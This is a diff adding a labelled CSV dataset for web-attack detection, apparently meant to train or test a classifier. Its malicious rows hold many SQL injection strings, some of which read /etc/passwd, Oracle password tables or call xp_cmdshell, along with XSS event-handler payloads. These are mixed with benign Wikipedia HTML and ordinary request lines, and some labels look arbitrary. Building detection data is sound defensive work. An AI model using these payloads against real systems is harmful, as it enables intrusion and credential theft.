@@ -1,0 +1,873 @@
+payload,label
+"<section draggable=""true"" ondragenter=""alert(1)"">test</section>",1
+"<ul id=""footer-icons"" class=""noprint"">",0
+"select * from users where id = 1 *$ . union select null,@@VERSION -- 1",1
+<noembed onpointerdown=alert(1)>XSS</noembed>,1
+select * from users where id = '1' <@&1 or 1 = 1 -- 1',1
+"<li><a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a> </li> </ul> </td>",0
+"<style>:target {transform: rotate(180deg);}</style><samp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></samp>",1
+"<li><a href=""/wiki/Neutral_monism"" title=""Neutral monism"">Neutral monism </a> </li>",0
+"admin"" )  or  ( ""1"" = ""1""#",1
+<track onpointerenter=alert(1)>XSS</track>,1
+"<span class=""fa fa-caret-down"">",0
+GET /admin/dashboard,1
+declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1
+</div>   </div>,0
+GET /products?id=27,0
+"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1
+"</span> <span class=""cs1-visible-error error citation-comment"">Missing or empty <code class=""cs1-code"">&#124;title= </code> (<a href=""/wiki/Help:CS1_errors#citation_missing_title"" title=""Help:CS1 errors"">help </a>)",0
+select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
+"select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1",1
+"<li><span class=""nowrap""><a href=""/wiki/Library_of_Congress_Control_Number"" title=""Library of Congress Control Number"">LCCN </a>: <span class=""uid""><a rel=""nofollow"" class=""external text"" href=""https://id.loc.gov/authorities/subjects/sh85008180"">sh85008180 </a>",0
+GET /products/view?id=43,0
+‘ or 1 = 1 --,1
+""" or ""a"" = ""a",1
+"<span class=""commit"">",0
+GET /products/view?id=40,0
+'  )  )   or   (  (  'x'  )  )   =   (  (  'x,1
+GET /products/view?id=8,0
+GET /products?id=21,0
+select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1
+GET /products?id=41,0
+<shadow onpointerup=alert(1)>XSS</shadow>,1
+"<li><a href=""/wiki/Competitions_and_prizes_in_artificial_intelligence"" title=""Competitions and prizes in artificial intelligence"">AI competitions </a> </li> </ul>",0
+"</p><p>To summarize, most neural networks use some form of <a href=""/wiki/Gradient_descent"" title=""Gradient descent"">gradient descent </a> on a hand-created neural topology. However, some research groups, such as <a href=""/wiki/Uber"" title=""Uber"">Uber </a>, argue that simple <a href=""/wiki/Neuroevolution"" title=""Neuroevolution"">neuroevolution </a> to mutate new neural network topologies and weights may be competitive with sophisticated gradient descent approaches<sup class=""noprint Inline-Template Template-Fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citation_needed"" title=""Wikipedia:Citation needed""><span title=""This claim needs references to reliable sources. (July 2019)"">citation needed",0
+"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationend=""alert(1)""></tfoot>",1
+<isindex onpointerenter=alert(1)>XSS</isindex>,1
+"<li id=""cite_note-Intuition-109""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Intuition_109-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Intuition_109-1""><sup><i><b>b </b> </i> </sup> </a>",0
+"<dl><dt><a href=""/wiki/Default_reasoning"" class=""mw-redirect"" title=""Default reasoning"">Default reasoning </a> and the <a href=""/wiki/Qualification_problem"" title=""Qualification problem"">qualification problem </a> </dt>",0
+GET /blog?id=12,0
+"</li><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/20px-Commons-logo.svg.png"" decoding=""async"" width=""20"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/30px-Commons-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/40px-Commons-logo.svg.png 2x"" data-file-width=""1024"" data-file-height=""1376"" />",0
+<details onpointerout=alert(1)>XSS</details>,1
+select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1
+admin' )  or  ( '1' = '1,1
+<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1
+GET /blog?id=11,0
+select * from users where id = 1.*1 or 1 = 1 -- 1,1
+"select * from users where id = '1' union select !<1,version (  )  -- 1'",1
+"<li><a href=""/wiki/Evolutionary_robotics"" title=""Evolutionary robotics"">Evolutionary robotics </a> </li>",0
+bfilename,1
+"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1
+"</span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FTCIAIG.2013.2286295"">10.1109/TCIAIG.2013.2286295 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Computational+Intelligence+and+AI+in+Games&amp;rft.atitle=A+Survey+of+Real-Time+Strategy+Game+AI+Research+and+Competition+in+StarCraft&amp;rft.volume=5&amp;rft.issue=4&amp;rft.pages=293-311&amp;rft.date=2013-12&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.406.2524&amp;rft_id=info%3Adoi%2F10.1109%2FTCIAIG.2013.2286295&amp;rft.aulast=Ontanon&amp;rft.aufirst=Santiago&amp;rft.au=Synnaeve%2C+Gabriel&amp;rft.au=Uriarte%2C+Alberto&amp;rft.au=Richoux%2C+Florian&amp;rft.au=Churchill%2C+David&amp;rft.au=Preuss%2C+Mike&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,1
+"<dialog ondblclick=""alert(1)"">test</dialog>",1
+"<style>:target {color: red;}</style><video id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></video>",1
+"<li><a href=""/wiki/Genetic_algorithm"" title=""Genetic algorithm"">Genetic algorithm </a> </li>",0
+"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1
+"Representing knowledge about knowledge: Belief calculus, <a href=""/wiki/Modal_logic"" title=""Modal logic"">modal logics </a>:",0
+s,1
+"<li><a href=""/wiki/Identity_(philosophy)"" title=""Identity (philosophy)"">Identity </a> </li>",0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;27, 32–58, 968–972 </li>",0
+"</span> <span class=""reference-text""><cite class=""citation journal"">Prakken, Henry (31 August 2017). ""On the problem of making autonomous vehicles conform to traffic law"". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_graphics"" title=""Computer graphics"">Graphics </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"</span> <span class=""reference-text"">The most dramatic case of sub-symbolic AI being pushed into the background was the devastating critique of <a href=""/wiki/Perceptron"" title=""Perceptron"">perceptrons </a> by <a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Marvin Minsky </a> and <a href=""/wiki/Seymour_Papert"" title=""Seymour Papert"">Seymour Papert </a> in 1969. See <a href=""/wiki/History_of_AI"" class=""mw-redirect"" title=""History of AI"">History of AI </a>, <a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a>, or <a href=""/wiki/Frank_Rosenblatt"" title=""Frank Rosenblatt"">Frank Rosenblatt </a>.",0
+"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>",1
+GET /search?q=mouse,0
+"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
+</span></a></dt><dd>Adjust crawl rate dynamically based on load.</dd>,0
+0x77616974666F722064656C61792027303A303A313027 ...,1
+admin' )  or '1' = '1'--,1
+"<li><a href=""/wiki/Information_retrieval"" title=""Information retrieval"">Information retrieval </a> </li> </ul>",0
+POST /products/delete?id=90,1
+"<nobr oncontextmenu=""alert(1)"">test</nobr>",1
+Revision <code>a4dbb775</code>.,0
+"</span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/David_Silver_(programmer)"" class=""mw-redirect"" title=""David Silver (programmer)"">Silver, David </a>; Schrittwieser, Julian; Simonyan, Karen; Antonoglou, Ioannis; <a href=""/wiki/Aja_Huang"" title=""Aja Huang"">Huang, Aja </a>; Guez, Arthur; Hubert, Thomas; Baker, Lucas; Lai, Matthew; Bolton, Adrian; <a href=""/wiki/Chen_Yutian"" title=""Chen Yutian"">Chen, Yutian </a>; Lillicrap, Timothy; <a href=""/wiki/Fan_Hui"" title=""Fan Hui"">Fan, Hui </a>; Sifre, Laurent; Driessche, George van den; Graepel, Thore; <a href=""/wiki/Demis_Hassabis"" title=""Demis Hassabis"">Hassabis, Demis </a> (19 October 2017). <a rel=""nofollow"" class=""external text"" href=""http://discovery.ucl.ac.uk/10045895/1/agz_unformatted_nature.pdf"">""Mastering the game of Go without human knowledge"" </a> <span class=""cs1-format"">(PDF)",0
+select * from users where id = 1 <@1$ or 1 = 1 -- 1,1
+"select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
+"<li><a href=""/wiki/Hans_Reichenbach"" title=""Hans Reichenbach"">Hans Reichenbach </a> </li>",0
+"<li><a href=""/wiki/Mathematical_analysis"" title=""Mathematical analysis"">Mathematical analysis </a> </li>",0
+"<ul><li><a href=""#CITEREFAlbus2002"">Albus 2002 </a> </li> </ul>",0
+"<div class=""section"" id=""getting-help"">",0
+<p>,0
+'||UTL_HTTP.REQUEST,1
+"select * from users where id = 1<@.. union select 1,version (  )  -- 1",1
+select * from users where id = '1' or $<\ or 1 = 1 -- 1',1
+or '1' = '1,1
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",1
+select * from users where id = 1 <@$_ or 1 = 1 -- 1,1
+"select * from users where id = 1 <@. union select 1,version (  )  -- 1",1
+"<del onbeforecut=""alert(1)"" contenteditable>test</del>",1
+"select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",1
+"</span> on 26 September 2007. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=AI+Magazine&amp;rft.atitle=A+%28Very%29+Brief+History+of+Artificial+Intelligence&amp;rft.pages=53-60&amp;rft.date=2005&amp;rft.aulast=Buchanan&amp;rft.aufirst=Bruce+G.&amp;rft_id=http%3A%2F%2Fwww.aaai.org%2FAITopics%2Fassets%2FPDF%2FAIMag26-04-016.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1",1
+"<li><a href=""/wiki/Gordon_Pask"" title=""Gordon Pask"">Gordon Pask </a> </li>",0
+"<li id=""cite_note-Bayesian_learning-209""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Bayesian_learning_209-0"">^ </a> </b>",0
+"select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1",1
+"<meta draggable=""true"" ondragstart=""alert(1)"">test</meta>",1
+'; exec master..xp_cmdshell,1
+&,1
+"<dialog onkeydown=""alert(1)"" contenteditable>test</dialog>",1
+select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
+GET /products?id=38,0
+<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>,1
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,1
+POST /cart/checkout,1
+GET /products?id=39,0
+"</span> from the original on 15 January 2016. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=AI+Matters&amp;rft.atitle=Future+Progress+in+Artificial+Intelligence%3A+A+Poll+Among+Experts&amp;rft.volume=1&amp;rft.issue=1&amp;rft.pages=9-11&amp;rft.date=2014&amp;rft_id=info%3Adoi%2F10.1145%2F2639475.2639478&amp;rft.aulast=M%C3%BCller&amp;rft.aufirst=Vincent+C.&amp;rft.au=Bostrom%2C+Nick&amp;rft_id=http%3A%2F%2Fwww.sophia.de%2Fpdf%2F2014_PT-AI_polls.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<audio oncontextmenu=""alert(1)"">test</audio>",1
+<base id=x tabindex=1 onactivate=alert(1)></base>,1
+GET /products/view?id=49,0
+' and 1 in  ( select var from temp ) --,1
+"<label onmousemove=""alert(1)"">test</label>",1
+"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1
+"<li><cite id=""CITEREFLenatGuha1989"" class=""citation book""><a href=""/wiki/Douglas_Lenat"" title=""Douglas Lenat"">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i>. Addison-Wesley. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-201-51752-1"" title=""Special:BookSources/978-0-201-51752-1""><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Building+Large+Knowledge-Based+Systems&amp;rft.pub=Addison-Wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=Lenat&amp;rft.aufirst=Douglas&amp;rft.au=Guha%2C+R.+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,1
+"select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
+"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></u>",1
+"select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1
+<noscript onpointerleave=alert(1)>XSS</noscript>,1
+""" or 1 = 1--",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+GET /blog?id=6,0
+</span></a></dt><dd>Tune Scrapy for crawling a lot domains in parallel.</dd>,0
+"<picture onmousemove=""alert(1)"">test</picture>",1
+"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0
+"<slot onkeydown=""alert(1)"" contenteditable>test</slot>",1
+anything' OR 'x' = 'x,1
+"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1
+<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,1
+"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menuitem>",1
+"select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
+select * from users where id = 1. or 1 = 1 -- 1,1
+GET /search?q=monitor,0
+GET /search?q=tablet,0
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Theory_of_computation"" title=""Theory of computation"">Theory of computation </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+'&',1
+;waitfor delay '0:0:__TIME__'--,1
+<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>,1
+"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
+GET /products?id=48,0
+"<data onmouseover=""alert(1)"">test</data>",1
+GET /products/view?id=52,0
+POST /products/delete?id=65,1
+"select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
+' UNION ALL SELECT,1
+"<li><a href=""/wiki/Property_dualism"" title=""Property dualism"">Property dualism </a> </li>",0
+"<ul><li>Gödel 1931, Church 1936, Kleene 1935, Turing 1937 </li> </ul>",0
+"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationend=""alert(1)""></center>",1
+GET /contact,0
+GET /search?q=ssd,0
+"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1
+"admin"" or 1 = 1/*",1
+<pre id=x tabindex=1 onfocus=alert(1)></pre>,1
+</span> </h3>,0
+"<source oncontextmenu=""alert(1)"">test</source>",1
+<iframe onpointerout=alert(1)>XSS</iframe>,1
+"<tr onmousedown=""alert(1)"">test</tr>",1
+--,1
+GET /search?q=camera,0
+</span></a>.</dd>,0
+GET /products/view?id=12,0
+<li>Memory,0
+?,1
+1 or pg_sleep ( __TIME__ ) --,1
+"select * from users where id = 1 *\. union select null,@@VERSION -- 1",1
+"<p class=""caption""><span class=""caption-text"">Solving specific problems",0
+"<summary draggable=""true"" ondragend=""alert(1)"">test</summary>",1
+"<li id=""cite_note-AI-331""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-AI_331-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-AI_331-1""><sup><i><b>b </b> </i> </sup> </a>",0
+GET /products/view?id=14,0
+"<col onbeforepaste=""alert(1)"" contenteditable>test</col>",1
+"select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1
+"</span> <span class=""toctext"">Machine consciousness, sentience and mind",0
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
+"<IMG SRC=""jav	ascript:alert('');"">",1
+GET /products?id=51,0
+"<rp onkeypress=""alert(1)"" contenteditable>test</rp>",1
+"""a"""" or 1 = 1--""",1
+"select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
+select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
+<dialog onpointerleave=alert(1)>XSS</dialog>,1
+"<p>Advancements in AI have contributed to the growth of the automotive industry through the creation and evolution of self-driving vehicles. As of 2016<sup class=""plainlinks noexcerpt noprint asof-tag update"" style=""display:none;""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Artificial_intelligence&amp;action=edit"">&#91;update&#93; </a> </sup>, there are over 30 companies utilizing AI into the creation of <a href=""/wiki/Self-driving_car"" title=""Self-driving car"">self-driving cars </a>. A few companies involved with AI include <a href=""/wiki/Tesla_Motors"" class=""mw-redirect"" title=""Tesla Motors"">Tesla </a>, <a href=""/wiki/Google"" title=""Google"">Google </a>, and <a href=""/wiki/Apple_Inc."" title=""Apple Inc."">Apple </a>.<sup id=""cite_ref-307"" class=""reference""><a href=""#cite_note-307"">&#91;296&#93; </a> </sup>",0
+"<a href=""/wiki/Reinforcement_learning"" title=""Reinforcement learning"">Reinforcement learning </a>:",0
+",@variable",1
+"a=alert,a(1)",1
+"select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1
+"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationstart=""alert(1)""></code>",1
+select * from users where id = 1 or !<@ or 1 = 1 -- 1,1
+"admin"" or ""1"" = ""1""/*",1
+"<command onmousemove=""alert(1)"">test</command>",1
+<discard onpointerover=alert(1)>XSS</discard>,1
+"<dir onmouseup=""alert(1)"">test</dir>",1
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy of artificial intelligence </a> and <a href=""/wiki/Ethics_of_artificial_intelligence"" title=""Ethics of artificial intelligence"">Ethics of artificial intelligence </a> </div>",0
+POST /products/delete?id=80,1
+"<nav onbeforecopy=""alert(1)"" contenteditable>test</nav>",1
+GET /home,0
+"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",1
+"</span> <span class=""reference-text""><cite class=""citation journal"">Smoliar, Stephen W.; Zhang, HongJiang (1994). ""Content based video indexing and retrieval"". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F93.311653"">10.1109/93.311653 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.gbgplc.com/inside/ai/"">""AI isn't taking over the world – it doesn't exist yet"" </a>. <i>GBG Global website </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=GBG+Global+website&amp;rft.atitle=AI+isn%27t+taking+over+the+world+%E2%80%93+it+doesn%27t+exist+yet&amp;rft_id=https%3A%2F%2Fwww.gbgplc.com%2Finside%2Fai%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<li><a href=""/wiki/Panpsychism"" title=""Panpsychism"">Panpsychism </a> </li>",0
+"select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1",1
+"<a href=""/wiki/Speech_recognition"" title=""Speech recognition"">Speech recognition </a>:",0
+POST /products/delete?id=75,1
+"This version is from <a href=""#CITEREFSearle1999"">Searle (1999) </a>, and is also quoted in <a href=""#CITEREFDennett1991"">Dennett 1991 </a>, p.&#160;435. Searle's original formulation was ""The appropriately programmed computer really is a mind, in the sense that computers given the right programs can be literally said to understand and have other cognitive states."" (<a href=""#CITEREFSearle1980"">Searle 1980 </a>, p.&#160;1). Strong AI is defined similarly by <a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig (2003 </a>, p.&#160;947): ""The assertion that machines could possibly act intelligently (or, perhaps better, act as if they were intelligent) is called the 'weak AI' hypothesis by philosophers, and the assertion that machines that do so are actually thinking (as opposed to simulating thinking) is called the 'strong AI' hypothesis.""",0
+"<li id=""cite_note-FOOTNOTELungarellaMettaPfeiferSandini2003-169""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTELungarellaMettaPfeiferSandini2003_169-0"">^ </a> </b>",0
+GET /products?id=5,0
+</span> 2017,0
+"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1
+"<samp onmousedown=""alert(1)"">test</samp>",1
+"</span> <span class=""reference-text""><cite class=""citation journal"">Poria, Soujanya; Cambria, Erik; Bajpai, Rajiv; Hussain, Amir (September 2017). ""A review of affective computing: From unimodal analysis to multimodal fusion"". <i>Information Fusion </i>. <b>37 </b>: 98–125. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.inffus.2017.02.003"">10.1016/j.inffus.2017.02.003 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/1893%2F25490"">1893/25490 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Information+Fusion&amp;rft.atitle=A+review+of+affective+computing%3A+From+unimodal+analysis+to+multimodal+fusion&amp;rft.volume=37&amp;rft.pages=98-125&amp;rft.date=2017-09&amp;rft_id=info%3Ahdl%2F1893%2F25490&amp;rft_id=info%3Adoi%2F10.1016%2Fj.inffus.2017.02.003&amp;rft.aulast=Poria&amp;rft.aufirst=Soujanya&amp;rft.au=Cambria%2C+Erik&amp;rft.au=Bajpai%2C+Rajiv&amp;rft.au=Hussain%2C+Amir&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<li><a href=""/wiki/Adaptable_robotics"" title=""Adaptable robotics"">Adaptable </a> </li>",0
+"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
+<noframes onpointerenter=alert(1)>XSS</noframes>,1
+"admin"" )  or ""1"" = ""1",1
+"<div class=""magnify""><a href=""/wiki/File:Overfitted_Data.png"" class=""internal"" title=""Enlarge""> </a> </div>The blue line could be an example of <a href=""/wiki/Overfitting"" title=""Overfitting"">overfitting </a> a linear function due to random noise. </div> </div> </div>",0
+"<style onkeyup=""alert(1)"" contenteditable>test</style>",1
+"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
+1,1
+"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1
+"<div class=""rst-content"">",0
+"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",1
+"<li><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www-formal.stanford.edu/jmc/whatisai/node3.html"">""Applications of AI"" </a>. <i>www-formal.stanford.edu </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">25 September",0
+hi' or 1 = 1 --,1
+GET /products?id=50,0
+"<li><a href=""/wiki/Semantic_Web"" title=""Semantic Web"">Semantic Web </a> </li>",0
+or 3 = 3,1
+select name from syscolumns where id  =   ( sele ...,1
+POST /products/delete?id=40,1
+"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
+"<li id=""cite_note-wp1-344""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-wp1_344-0"">^ </a> </b>",0
+POST /products/delete?id=85,1
+"select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1
+"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;139–179, 245–250, 322–323 (EPAM) </li>",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"<h3><span class=""mw-headline"" id=""Logic"">Logic",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
+GET /blog?id=7,0
+<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,1
+"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1
+"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
+' or '1' = '1'--,1
+PRINT,1
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related techniques </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+' )  or  ( 'x' = 'x,1
+uni/**/on sel/**/ect,1
+@variable,1
+GET /manage/orders,1
+"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1
+GET /blog?id=8,0
+"<li><a href=""/wiki/Evolutionary_algorithm"" title=""Evolutionary algorithm"">Evolutionary algorithm </a> </li>",0
+POST /products/delete?id=35,1
+;s,1
+""" or pg_sleep ( __TIME__ ) --",1
+"select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",1
+<span onpointerenter=alert(1)>XSS</span>,1
+POST /products/delete?id=55,1
+' having 1 = 1--,1
+--sp_password,1
+"<thead draggable=""true"" ondragleave=""alert(1)"">test</thead>",1
+"select * from users where id = 1 + @`\` union select 1,version (  )  -- 1",1
+"select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1
+<textarea oncut=alert(1) autofocus>XSS</textarea>,1
+"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" ontransitionend=alert(1)></output>",1
+</span>,0
+<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,1
